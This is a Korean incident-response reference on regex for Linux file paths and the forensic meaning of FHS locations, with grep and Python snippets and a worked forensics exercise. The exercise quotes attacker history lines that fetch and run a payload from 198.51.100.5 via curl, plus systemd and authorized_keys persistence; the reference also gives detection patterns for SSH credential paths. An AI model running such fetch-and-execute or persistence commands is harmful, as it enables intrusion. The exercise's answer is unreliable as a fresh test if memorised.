---
id: FOR-0138
title: "Linux 경로 regex와 FHS 주요 경로별 포렌식 의미"
slug: "linux-path-regex"
category: "로그/Regex"
type: "reference"
difficulty: "basic"
priority: "critical"
platform: [linux]
artifact: ["auth.log", "syslog", "bash_history", "crontab", "audit.log", "journal"]
file_paths: ["/var/log", "/etc/passwd", "/etc/shadow", "/etc/crontab", "/tmp", "/var/tmp", "/dev/shm", "/root/.bash_history", "/home/*/.ssh/authorized_keys", "/var/spool/cron/crontabs", "/etc/ld.so.preload", "/etc/systemd/system"]
registry_paths: []
event_ids: []
protocols: []
tools: ["grep", "ripgrep", "awk", "Python", "readlink", "find"]
commands: ["grep -Eo '/(?:[^/[:space:]]+/)*[^/[:space:]]+' app.log", "grep -Eo '(^|[^[:alnum:]_/])(/tmp|/var/tmp|/dev/shm)/[^[:space:]]+' bash_history", "readlink -f /proc/1234/exe"]
regex_patterns: ["/(?:[^/\\0]+/)*[^/\\0]*", "(?:/[^/\\s]+)+", "~(?:/[^/\\s]+)*", "^(?:/tmp|/var/tmp|/dev/shm|/run/shm)/", "/\\.[^/\\s]+", "/home/[^/]+/\\.ssh/(?:authorized_keys|id_[a-z0-9]+|known_hosts)"]
wireshark_filters: []
tshark_fields: []
log_fields: ["path", "exe", "cwd", "COMMAND", "PWD"]
file_formats: ["log", "txt", "json"]
primary_terms: ["Linux 경로 regex", "리눅스 경로 정규식"]
keywords: ["Linux path regex", "리눅스 경로 정규식", "FHS", "절대경로", "상대경로", "홈 디렉터리", "심볼릭 링크", "dev/shm", "world writable", "숨김 파일", "경로 추출"]
aliases: ["리눅스 경로 정규식", "경로 정규식 리눅스", "path regex linux", "슬래시 경로 뽑기", "fhs 경로", "리눅스 어디 봐야", "tmp 악성코드"]
symptom_keywords: ["로그에서 파일 경로만 뽑고 싶다", "경로가 어디서 끝나는지 모르겠다", "공백 들어간 경로가 잘린다", "리눅스에서 어느 디렉터리를 봐야 하는지 모르겠다", "심볼릭 링크인지 실제 파일인지 모르겠다", "숨김 파일을 찾고 싶다"]
related: ["FOR-0137", "FOR-0128", "FOR-0144", "FOR-0145"]
source_ids: ["SRC-080", "SRC-057"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

Linux 경로에서 금지된 문자는 `/`와 NUL **딱 두 개**뿐이라 정규식으로 "경로의 끝"을 안전하게 판정할 수 없다 — 그래서 실전에서는 `(?:/[^/\s]+)+`로 공백 앞까지만 잡고, 경로 목록이 정확해야 할 때는 정규식이 아니라 `find -print0` / `awk` 필드 / `readlink -f`로 확정한다.

## 개념

경로 규칙은 Windows보다 단순하지만, 그 단순함이 곧 함정이다.

| 항목 | 규칙 | 정규식에 주는 영향 |
| --- | --- | --- |
| 구분자 | `/` 하나뿐 | 이스케이프 불필요. `\\` 지옥이 없다 |
| 금지 문자 | `/`와 `\0` **뿐** | 공백·개행·따옴표·이모지·제어문자가 파일명에 **합법** |
| 대소문자 | 구분한다 | `-i`를 함부로 쓰면 오탐이 늘어난다 |
| 연속 슬래시 | `//etc///passwd` = `/etc/passwd` | 정규식으로는 다른 문자열 |
| 후행 슬래시 | `/tmp/` = `/tmp` (디렉터리) | 위와 동일 |
| `.` / `..` | 현재/상위 디렉터리 | `/var/log/../../tmp/x` 우회 표기 |
| 최대 길이 | 구성요소 255바이트, 전체 4096바이트(리눅스 관례) | 잘린 경로 판정 기준 |

| 형태 | 예 | 정규식 조각 |
| --- | --- | --- |
| 절대경로 | `/var/log/auth.log` | `(?:/[^/\s]+)+` |
| 절대 디렉터리 | `/var/log/` | `(?:/[^/\s]+)+/?` |
| 상대경로 | `./run.sh`, `../etc/passwd`, `bin/x` | `\.{0,2}/[^/\s]+` |
| 홈 확장 | `~/.ssh/id_rsa`, `~hong/x` | `~[\w.-]*(?:/[^/\s]+)*` |
| 루트 | `/` | `^/$` |

### `~`는 파일시스템이 아니라 셸이 처리한다

`~`는 **셸(bash/zsh)이 확장하는 토큰**이고 커널·`open()`에는 그런 개념이 없다. 그래서 `~/.ssh/id_rsa`라는 문자열은 `bash_history`·스크립트·명령행 로그에서만 보이고, `audit.log`의 `path=` 필드나 `/proc/<pid>/cmdline`에는 확장된 절대경로가 남는다. **두 형태를 모두 검색해야 한다.**

```text
~(?:/[^/\s]+)*            # ~/.ssh/id_rsa
~[A-Za-z_][\w.-]*(?:/[^/\s]+)*   # ~hong/.ssh/id_rsa
\$HOME(?:/[^/\s]+)*       # $HOME/.ssh/id_rsa
```

### 공백·특수문자가 들어간 경로

파일명에 공백이 합법이므로 `/tmp/my file.txt`가 존재할 수 있다. 로그 한 줄이 `failed to open /tmp/my file.txt: EACCES`라면 정규식만으로는 경로가 `/tmp/my`에서 끝나는지 `/tmp/my file.txt`에서 끝나는지 **알 수 없다.** 판정 근거는 정규식 밖에 있다.

| 근거 | 방법 |
| --- | --- |
| 로그가 경로를 인용부호로 감싼다 | `"([^"]+)"` 또는 `'([^']+)'` 기준으로 잡는다 |
| 로그가 구조화 필드다 | `auditd`의 `path=`, JSON의 `.path`, `journalctl -o json` |
| 확장자가 있다 | `(?:/[^/\s]+)*/[^/\s]*\.(?:sh\|py\|so\|log)\b`로 끝을 고정 |
| 콜론으로 끝난다 | `((?:/[^/\s]+)+):` — `perror` 관례 |
| 실제 파일시스템이 있다 | 후보를 뽑아 `test -e`로 존재 확인 |

특수문자를 포함한 이름은 그 자체가 신호다. 개행·백스페이스·ANSI 이스케이프를 파일명에 넣어 `ls` 출력을 속이는 기법이 있다.

```bash
# 출력할 수 없는 문자가 들어간 파일명 찾기
ls -lb /tmp                      # 비출력 문자를 \nnn 으로 표시
find /tmp -name '*[[:cntrl:]]*'  # 제어문자 포함 이름
find / -name '.. *' -o -name '. *' 2>/dev/null   # 공백 붙은 점 디렉터리
```

## 파일 / 경로

FHS 주요 경로와 **각각을 왜 여는지**다. 이 표가 리눅스 침해사고 대응의 체크리스트다.

| 경로 | FHS 용도 | 포렌식에서 보는 이유 |
| --- | --- | --- |
| `/var/log/` | 로그 | 모든 것의 출발점. 아래에 따로 정리 |
| `/etc/passwd` | 사용자 목록 | UID 0 추가 계정, 셸이 `/bin/bash`인 서비스 계정 |
| `/etc/shadow` | 암호 해시 | 해시 형식(`$6$`=SHA-512), 마지막 변경일 필드 |
| `/etc/group`, `/etc/sudoers`, `/etc/sudoers.d/` | 권한 | `sudo`/`wheel` 그룹 추가, `NOPASSWD:ALL` 삽입 |
| `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.*/` | 예약 작업 | 지속성 1순위 |
| `/var/spool/cron/crontabs/<user>` (Debian계) | 사용자 crontab | `crontab -e`의 실제 저장 위치 |
| `/var/spool/cron/<user>` (RHEL계) | 사용자 crontab | 배포판에 따라 경로가 다르다 |
| `/etc/systemd/system/`, `/lib/systemd/system/` | 서비스 유닛 | 악성 `.service` 지속성, `ExecStart=` 확인 |
| `/etc/rc.local`, `/etc/init.d/` | 부팅 스크립트 | 레거시 지속성 |
| `/etc/ld.so.preload` | 전역 프리로드 | **정상적으로는 없거나 비어 있다.** 존재하면 루트킷 강한 신호 |
| `/etc/ssh/sshd_config` | SSH 설정 | `PermitRootLogin`, `AuthorizedKeysFile` 변조 |
| `/home/<user>/.ssh/authorized_keys` | 공개키 | **공격자 키 추가 = 지속성.** 키 주석에 호스트명이 남는다 |
| `/home/<user>/.ssh/id_rsa`, `id_ed25519` | 개인키 | 탈취 대상. 측면 이동 |
| `/home/<user>/.ssh/known_hosts` | 접속 이력 | 이 호스트에서 **어디로** 접속했는지 |
| `/root/.bash_history` | root 명령 이력 | 시각이 없다(기본). `HISTTIMEFORMAT` 설정 시에만 있음 |
| `/home/<user>/.bash_history` | 사용자 명령 이력 | 크기 0이거나 `/dev/null` 심링크면 은닉 |
| `/home/<user>/.bashrc`, `.profile`, `.bash_profile` | 셸 초기화 | `alias`/함수로 명령 가로채기, `unset HISTFILE` |
| `/tmp/` | 임시 파일 | **world-writable.** 페이로드 드롭 1순위 |
| `/var/tmp/` | 재부팅 후에도 남는 임시 파일 | `/tmp`보다 오래 산다. 여기가 더 나쁘다 |
| `/dev/shm/` | tmpfs 공유 메모리 | world-writable + **디스크에 안 남는다.** 메모리 상주 페이로드 |
| `/run/`, `/var/run/` | 런타임 상태 | PID 파일, 소켓. 재부팅 시 사라짐 |
| `/proc/<pid>/exe`, `cmdline`, `cwd`, `environ` | 프로세스 정보 | 실행 중 프로세스의 실제 바이너리(삭제됐어도 링크는 남는다) |
| `/usr/local/bin/`, `/opt/` | 로컬 설치 | 패키지 관리자 밖의 바이너리. 정당성 확인 필요 |
| `/usr/bin/`, `/bin/`, `/sbin/` | 시스템 바이너리 | 무결성 검증 대상(`rpm -Va`, `debsums`) |
| `/boot/` | 커널·initramfs | 부트킷 |
| `/lib/modules/` | 커널 모듈 | 루트킷 `.ko` |

### `/var/log` 하위

| 파일 | 내용 | 배포판 |
| --- | --- | --- |
| `/var/log/auth.log` | 인증(sshd, sudo, PAM) | Debian/Ubuntu |
| `/var/log/secure` | 위와 동일 | RHEL/CentOS/Rocky |
| `/var/log/syslog` | 일반 시스템 로그 | Debian/Ubuntu |
| `/var/log/messages` | 위와 동일 | RHEL계 |
| `/var/log/wtmp` | 로그인 성공 이력 (바이너리) | `last` |
| `/var/log/btmp` | 로그인 실패 이력 (바이너리) | `lastb` |
| `/var/run/utmp` | 현재 로그인 세션 (바이너리) | `who` |
| `/var/log/lastlog` | 계정별 최종 로그인 (바이너리) | `lastlog` |
| `/var/log/audit/audit.log` | auditd | `ausearch` |
| `/var/log/apache2/access.log`, `error.log` | 웹 (Debian) | |
| `/var/log/httpd/access_log`, `error_log` | 웹 (RHEL) | |
| `/var/log/nginx/access.log`, `error.log` | 웹 | |
| `/var/log/cron`, `/var/log/syslog` | cron 실행 기록 | 배포판에 따라 다름 |
| `/var/log/journal/` | systemd 저널 (바이너리) | `journalctl --file` |

`*.1`, `*.gz`, `*-20260314` 같은 회전 파일을 반드시 함께 본다. **현재 파일만 보면 사고 시점이 이미 회전되어 사라진 경우를 놓친다.**

```bash
zgrep -h 'Failed password' /var/log/auth.log*     # .gz 포함 전부
```

## 주요 필드

### 패턴 1 — 절대경로 후보 (가장 많이 쓴다)

```text
(?:/[^/\s]+)+
```

| 항목 | 값 |
| --- | --- |
| 매칭됨 | `/var/log/auth.log`, `/tmp/x`, `/etc/passwd` |
| 매칭 안 됨 | `/` (루트 단독), `./run.sh`, `~/.ssh/id_rsa` |
| 오탐 | URL 경로 `GET /admin/index.php`, 날짜 `14/Mar/2026`, 분수 `1/2` |

**URL 경로와 파일 경로가 구별되지 않는다는 점이 가장 큰 오탐 원인이다.** 웹 로그를 섞어 돌리면 `/index.php`가 파일 경로로 잡힌다. 앞에 `http`나 따옴표+메서드가 오는 것을 배제한다.

```text
(?<!\w)(?<!//)(?:/[^/\s]+)+
```

### 패턴 2 — 확장자로 끝을 고정 (정밀도 우선)

```text
(?:/[^/\s]+)*/[^/\s]*\.(?:sh|bash|py|pl|rb|php|so|ko|log|conf|key|pem|tar|gz|zip|elf|bin)\b
```

### 패턴 3 — world-writable 디렉터리 (의심 1순위)

```text
(?:^|[^\w/])(/tmp|/var/tmp|/dev/shm|/run/shm)/[^/\s]+
```

| 경로 | 정상 사용 | 공격에서의 의미 |
| --- | --- | --- |
| `/tmp` | 컴파일 임시 파일, 세션 파일, `systemd-private-*` | 페이로드 드롭·컴파일·실행 |
| `/var/tmp` | 패키지 빌드 잔여물 | 재부팅 후에도 남는다. 지속성과 결합 |
| `/dev/shm` | PostgreSQL/Chrome 공유 메모리 | 디스크에 안 남는다. **실행 파일이 있으면 거의 확정** |
| `/run/shm` | `/dev/shm` 심링크(구 배포판) | 위와 동일 |

`/tmp`에 **실행 권한이 붙은 파일**이 있으면 그 자체로 조사 대상이다.

```bash
find /tmp /var/tmp /dev/shm -type f -perm -u+x -printf '%T+ %s %M %p\n' 2>/dev/null | sort
```

### 패턴 4 — 숨김 파일·디렉터리

```text
/\.[^/\s]+
```

| 예 | 판단 |
| --- | --- |
| `/home/hong/.bashrc`, `/root/.ssh` | 정상 |
| `/tmp/.X11-unix` | 정상(X 소켓) |
| `/tmp/.ICE-unix`, `/tmp/.font-unix` | 정상 |
| `/tmp/.x`, `/var/tmp/.systemd`, `/dev/shm/.a` | **의심.** `/tmp` 숨김 파일 이름은 기준선과 비교한다 |
| `/usr/bin/...`, `/tmp/.. ` (점 두 개 + 공백) | 강한 의심. `ls`에서 안 보이게 하는 고전 기법 |

### 패턴 5 — SSH 키·자격증명 경로

```text
/(?:home/[^/]+|root)/\.ssh/(?:authorized_keys|id_[a-z0-9]+|known_hosts|config)
```

이 경로가 `bash_history`나 `auth.log`에 나오면 지속성 또는 자격증명 탈취 시점이다.

### 심볼릭 링크

정규식은 경로 문자열만 본다. **그 경로가 실제로 무엇을 가리키는지는 정규식이 답할 수 없다.**

| 확인할 것 | 명령 | 나오는 값 |
| --- | --- | --- |
| 최종 대상 | `readlink -f /path` | 링크를 모두 따라간 절대경로 |
| 링크 1단계 | `readlink /path` | 링크가 저장한 문자열 그대로 |
| 링크 여부 | `ls -l /path` | `lrwxrwxrwx ... -> target` |
| 삭제된 바이너리 | `readlink /proc/<pid>/exe` | `/tmp/x (deleted)` |
| 이미지 안에서 | `fls`/Autopsy의 타입 열 | `l/l` = 심링크 |

`~/.bash_history -> /dev/null`은 은닉의 전형이다. `ls -l`로 확인한다.

## 빠른 명령

```bash
grep -Eo '(^|[^[:alnum:]_/])(/tmp|/var/tmp|/dev/shm)/[^[:space:]]+' bash_history
```

```bash
# 1) 로그에서 절대경로 후보 전부 + 빈도
grep -Eo '(/[^/[:space:]]+)+' app.log | sort | uniq -c | sort -nr | head -20

# 2) world-writable 경로만 (의심 1순위)
grep -Eo '(/tmp|/var/tmp|/dev/shm|/run/shm)/[^[:space:]]+' /var/log/* 2>/dev/null | sort -u

# 3) 스크립트/바이너리 경로만
grep -Eo '(/[^/[:space:]]+)*/[^/[:space:]]*\.(sh|py|pl|so|ko|elf|bin)\b' app.log | sort -u

# 4) 인용부호로 감싸인 경로 (공백 포함 경로를 정확히)
grep -Po "(?<=')[^']+(?=')" app.log | grep -E '^/'

# 5) auditd 는 정규식 대신 필드를 쓴다 -- 오탐 0
ausearch -f /etc/passwd -i
awk -F'path=' '/path=/{split($2,a," ");print a[1]}' /var/log/audit/audit.log | sort | uniq -c | sort -nr

# 6) 홈 확장 형태와 확장된 형태를 함께
grep -Eo '(~|\$HOME)(/[^/[:space:]]+)*' bash_history | sort -u
grep -Eo '/(home/[^/]+|root)/\.ssh/[^/[:space:]]*' bash_history /var/log/auth.log | sort -u

# 7) 후보를 실제 파일시스템으로 검증한다 (정규식 오탐 제거)
grep -Eoh '(/[^/[:space:]]+)+' app.log | sort -u |
  while IFS= read -r p; do [ -e "$p" ] && printf '%s\n' "$p"; done

# 8) 경로 목록을 정확히 다루려면 -print0 / -z
find /tmp -type f -print0 | xargs -0 ls -l      # 공백 파일명 안전
grep -rlZ 'flag{' /var/www | xargs -0 stat -c '%y %n'
```

```python
import os, re
from collections import Counter

ABS      = re.compile(r'(?<!\w)(?:/[^/\s]+)+')
SUSPECT  = re.compile(r'(?:^|[^\w/])(/tmp|/var/tmp|/dev/shm|/run/shm)/[^/\s]+')
HIDDEN   = re.compile(r'/\.[^/\s]+')
SSHKEY   = re.compile(r'/(?:home/[^/]+|root)/\.ssh/(?:authorized_keys|id_[a-z0-9]+|known_hosts|config)')

text = open('app.log', encoding='utf-8', errors='replace').read()

for p, n in Counter(ABS.findall(text)).most_common(20):
    print(f'{n:6d}  {p}')

# 정규식으로 뽑고 os.path 로 정규화한다 -- /var/log/../../tmp/x 우회를 잡는다
for cand in set(ABS.findall(text)):
    norm = os.path.normpath(cand)
    if norm != cand:
        print(f'우회 표기: {cand}  ->  {norm}')

# 분해는 정규식이 아니라 posixpath 로
import posixpath
p = '/home/hong/.ssh/authorized_keys'
print(posixpath.dirname(p), posixpath.basename(p), posixpath.splitext(p)[1])
```

## 함께 보는 artifact

| 경로에서 얻은 것 | 다음 목표 |
| --- | --- |
| `/tmp/x` 같은 드롭 파일 | `stat`로 mtime/ctime, `file`로 타입, 해시 |
| 실행된 스크립트 경로 | `auth.log`의 `sudo ... COMMAND=`, `audit.log`의 `execve` |
| `authorized_keys` 변경 | 그 시각의 `auth.log` `Accepted publickey` |
| crontab 경로 | `/var/log/cron`(또는 `syslog`)에서 실제 실행 기록 |
| `/proc/<pid>/exe` 가 `(deleted)` | 메모리에서 바이너리 회수 (`/proc/<pid>/exe` 복사) |
| 웹 업로드 경로 | `access.log`의 POST 요청 시각 |
| `bash_history` 명령 | 의심 명령 패턴 대조 |
| 파일 mtime | 같은 시각대의 모든 로그 재검색 |
| 로그에 IP가 함께 있다 | IPv4 추출 ([FOR-0128](./ipv4-regex.html))로 접속원 확정 |
| 디스크 이미지가 있다 | `fls`로 경로 목록 확보 ([FOR-0041](./tsk-fls.html)) 후 `icat` 회수 |
| 어디서 시작할지 모르겠다 | 30초 트리아지 ([FOR-0001](./30sec-triage.html)) |

## 흔한 실수

- **`\s`로 경로 끝을 판정하고 끝내는 것.** 파일명에 공백이 합법이므로 `/tmp/my file.txt`가 `/tmp/my`로 잘린다. 인용부호·구조화 필드·확장자 앵커 중 하나로 끝을 고정하거나, 후보를 `test -e`로 검증한다.
- **URL 경로를 파일 경로로 착각하는 것.** `access.log`에 `(?:/[^/\s]+)+`를 돌리면 `/admin/index.php`가 전부 잡힌다. 대상 파일을 나눠서 돌린다.
- **대소문자 무시로 검색하는 것.** Linux는 대소문자를 구분한다. `/etc/Passwd`는 존재하지 않는 경로이므로 `-i`는 오탐만 늘린다. 반대로 `/tmp/A`와 `/tmp/a`는 **다른 파일**이다.
- **연속 슬래시와 후행 슬래시를 다른 경로로 세는 것.** `//tmp/x`, `/tmp//x`, `/tmp/x/`는 같은 대상이다. 집계 전에 `os.path.normpath`로 정규화한다.
- **`.`/`..` 우회 표기를 놓치는 것.** `/var/www/uploads/../../../etc/passwd`는 `/etc/passwd`다. 웹 로그의 디렉터리 트래버설도 같은 원리이고 `%2e%2e%2f` URL 인코딩 변형까지 있다.
- **`~`로 검색을 끝내는 것.** `bash_history`에는 `~/.ssh/id_rsa`가, `audit.log`에는 `/home/hong/.ssh/id_rsa`가 남는다. 두 형태를 모두 돌린다.
- **회전 로그를 안 보는 것.** `/var/log/auth.log`만 보면 `auth.log.1`, `auth.log.2.gz`에 있는 사고 당일 기록을 통째로 놓친다. `zgrep ... /var/log/auth.log*`.
- **배포판 차이를 무시하는 것.** `auth.log`(Debian) vs `secure`(RHEL), `crontabs/<user>`(Debian) vs `cron/<user>`(RHEL)로 경로가 다르다. 없으면 다른 이름으로 다시 찾는다.
- **심볼릭 링크를 실제 파일로 보는 것.** `/bin`이 `/usr/bin` 심링크인 배포판(usrmerge)에서는 같은 파일이 두 경로로 나온다. `readlink -f`로 정규화해야 중복이 사라진다.
- **`/dev/shm`을 안 보는 것.** tmpfs이므로 이미지에는 없고 라이브 시스템이나 메모리 덤프에만 있다. 라이브 대응 시 가장 먼저 본다.
- **파일명 특수문자를 셸에 그대로 넘기는 것.** `-rf` 로 시작하는 파일명, 개행 포함 파일명이 명령을 깨뜨린다. `find -print0` / `xargs -0` / `--`를 쓴다.
- **바이너리 로그를 `grep`으로 여는 것.** `wtmp`/`btmp`/`lastlog`/`journal`은 텍스트가 아니다. `last -f`, `lastb -f`, `journalctl --file`로 읽는다.

## mini example

```text
문제:
"침해된 Ubuntu 서버의 bash_history 와 auth.log 에서
 공격자가 남긴 페이로드 파일의 전체 경로와 지속성 수단을 구하세요."
첨부: bash_history (412줄), auth.log (88,204줄)

1. 첫 시도 (실패):
   $ grep -E '/tmp/*' bash_history
   (거의 모든 줄이 나옴)

   이유: ERE 에서 `/tmp/*` 는 "`/tmp` 뒤에 `/` 가 0개 이상" 이다.
        `*` 는 셸 와일드카드가 아니라 앞 문자의 반복이므로
        `/tmp` 만 있어도 매칭되고, 게다가 부분 문자열 매칭이라
        `/tmpfs`, `/var/tmp` 까지 걸린다.

2. 접근 변경 -- 뒤에 실제 이름이 오는 것만
   $ grep -Eo '(/tmp|/var/tmp|/dev/shm)/[^[:space:]]+' bash_history | sort -u
   /dev/shm/.k
   /tmp/.build
   /tmp/nginx-1.24.0.tar.gz
   /tmp/systemd-private-3f2a-upower.service-Xk2Lp9

   4건. tar.gz 와 systemd-private 는 정상 패턴이다.
   `/dev/shm/.k` 와 `/tmp/.build` 가 숨김 이름이라 남는다.

3. 원문 문맥 확인
   $ grep -n -E '/dev/shm/\.k|/tmp/\.build' bash_history
   288:curl -s http://198.51.100.5/k -o /dev/shm/.k
   289:chmod +x /dev/shm/.k
   290:/dev/shm/.k &
   301:mkdir /tmp/.build
   302:cp /dev/shm/.k /tmp/.build/kworker

   `/dev/shm` 은 tmpfs 라서 재부팅하면 사라진다.
   그래서 공격자가 `/tmp/.build/kworker` 로 복사했다.

4. 두 번째 시도 (실패) -- 지속성을 crontab 에서 찾으려 했다
   $ grep -E 'crontab' bash_history
   (0건)

   이유: 이 공격자는 `crontab` 명령을 쓰지 않았다.
        명령 이름으로 찾는 대신 **지속성 경로**로 찾아야 한다.

5. 접근 변경 -- 지속성 경로 목록으로 검색
   $ grep -Eo '/etc/(crontab|cron\.[a-z.]+|systemd/system|rc\.local|ld\.so\.preload)[^[:space:]]*|/(home/[^/]+|root)/\.ssh/authorized_keys' bash_history | sort -u
   /etc/systemd/system/kworker.service
   /root/.ssh/authorized_keys

   두 가지 지속성이 나왔다.

6. auth.log 로 교차검증 -- 키가 추가된 뒤 접속했는가
   $ grep -E 'Accepted (publickey|password)' auth.log | tail -3
   Mar 14 07:18:39 web01 sshd[3901]: Accepted password for svc_backup from 198.51.100.5 port 52890 ssh2
   Mar 14 08:02:11 web01 sshd[4820]: Accepted publickey for root from 198.51.100.5 port 41002 ssh2: RSA SHA256:kQ9...
   Mar 14 09:47:03 web01 sshd[6114]: Accepted publickey for root from 203.0.113.90 port 33188 ssh2: RSA SHA256:kQ9...

   같은 키 지문으로 다른 IP 에서 root 로 재접속했다.
   `authorized_keys` 추가가 실제로 사용됐다는 확증이다.

7. 세 번째 확인 -- 경로 존재 검증으로 오탐 제거
   $ grep -Eoh '(/[^/[:space:]]+)+' bash_history | sort -u |
       while IFS= read -r p; do [ -e "$p" ] || printf 'MISSING %s\n' "$p"; done | head -3
   MISSING /dev/shm/.k
   MISSING /tmp/nginx-1.24.0.tar.gz

   `/dev/shm/.k` 가 사라진 것은 재부팅 때문이다(tmpfs).
   반면 `/tmp/.build/kworker` 는 남아 있다 -> 회수 대상.

정답: 페이로드 /tmp/.build/kworker (최초 드롭 /dev/shm/.k)
      지속성 /etc/systemd/system/kworker.service + /root/.ssh/authorized_keys
```

1단계와 4단계가 교훈이다. **`*`는 와일드카드가 아니라 반복 수량자이고, 지속성은 명령 이름이 아니라 경로로 찾는다.**

## 출처

- SRC-080 — Filesystem Hierarchy Standard 3.0: `/etc` `/var/log` `/tmp` `/var/tmp` `/run` `/proc` `/usr/local` `/opt` `/boot` 의 정의된 용도, `/var/tmp`가 재부팅 후에도 보존된다는 규정, `/tmp` 삭제 정책
- SRC-057 — Python 문서, `re`: 문자 클래스, lookbehind 제약, `os.path`/`posixpath` 정규화
- `auth.log` vs `secure`, `crontabs/<user>` vs `cron/<user>` 등 로그·crontab 경로는 배포판과 버전에 따라 다르므로 대상 시스템에서 실제 파일 존재를 확인할 것
- `/dev/shm`, `/run/shm`의 마운트 여부와 `noexec` 옵션은 배포판 설정에 따라 다르므로 `mount`로 확인할 것
- 경로 최대 길이(구성요소 255바이트, 전체 4096바이트)는 리눅스의 일반적인 값이며 파일시스템과 커널 설정에 따라 다를 수 있다
